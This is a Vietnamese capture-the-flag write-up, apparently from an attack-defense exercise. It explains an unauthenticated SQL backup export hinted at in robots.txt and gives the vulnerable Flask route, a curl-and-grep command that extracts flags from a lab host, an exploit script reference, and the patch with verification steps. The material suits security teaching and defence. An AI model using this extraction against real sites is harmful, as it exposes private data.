# 05 · Lộ bản backup — Bản xuất dữ liệu vận hành

| | |
|---|---|
| **Khu vực** | `GET /exports/operations.sql` (gợi ý trong `/robots.txt`) |
| **Cần đăng nhập** | Không |
| **Flag nằm ở** | `reconciliation_notes.value` |
| **Script** | [`exploits/backup.py`](exploits/backup.py) |

## 1. Nhận dạng (black-box)

- Xem `GET /robots.txt`:

  ```
  User-agent: *
  Disallow: /staff
  Disallow: /exports/
  ```

- `Disallow: /exports/` là gợi ý kinh điển: có tài nguyên nhạy cảm bị để công khai dưới
  `/exports/`. Thử `GET /exports/operations.sql` → tải về một bản dump SQL **không cần đăng nhập**.
- Nội dung là các câu `INSERT INTO reconciliation_notes(...)` — bản đối soát vận hành nội bộ,
  nơi checker cắm flag.

## 2. Phân tích mã nguồn

[`sandbox/app/app.py`](../sandbox/app/app.py) · hàm `operations_export` (≈ dòng 516–530):

```python
@app.get("/exports/operations.sql")
def operations_export():
    if patched("backup") and session.get("staff") is not True:   # <-- chỉ chặn khách khi đã vá
        abort(404)
    with connect(db_path) as db:
        rows = db.execute("SELECT ref,value FROM reconciliation_notes ORDER BY id DESC LIMIT 100").fetchall()
    lines = [...]
    for row in rows:
        ref, value = (row[key].replace("'", "''") for key in ("ref", "value"))
        lines.append("INSERT INTO reconciliation_notes(ref,value) VALUES ('" + ref + "','" + value + "');")
    return "\n".join(lines) + "\n", 200, {"Content-Type": "text/plain; charset=utf-8"}
```

- Route **không có** `@staff_required`. Khi chưa vá, điều kiện chặn bị bỏ qua ⇒ **bất kỳ ai**
  (kể cả chưa đăng nhập) tải được bản dump chứa toàn bộ `reconciliation_notes.value` (flag).

## 3. Khai thác thủ công

```bash
curl -s "http://10.90.0.12/exports/operations.sql" \
  | grep -oE 'MekoDataCTF\{[A-Z0-9]{30}\}'
```

Đây là lỗ hổng đơn giản nhất: một request GET, không cần phiên đăng nhập.

## 4. Script tự động

[`exploits/backup.py`](exploits/backup.py) tải bản xuất và lọc flag:

```bash
python backup.py http://10.90.0.12
```

## 5. Bản vá

Bật khóa `backup`:

```json
{"backup": true}
```

Khi vá, khách không phải nhân viên (`session["staff"] != True`) nhận **404**; chỉ phiên nhân
viên (`/staff/login`) mới tải được bản xuất. **Không gỡ hẳn** chức năng — nhân viên vẫn cần nó.
(Chi tiết: [PATCHES.md](PATCHES.md).)

**Tự kiểm chứng sau vá:**
- Đăng nhập `/staff/login` rồi tải `/exports/operations.sql` ⇒ vẫn 200 (nhân viên dùng được).
- Tải khi **chưa** đăng nhập nhân viên ⇒ **404**; script `backup.py` trả **0 flag**.
- Checker Backup vẫn UP (nó đăng nhập nhân viên trước khi tải bản xuất).
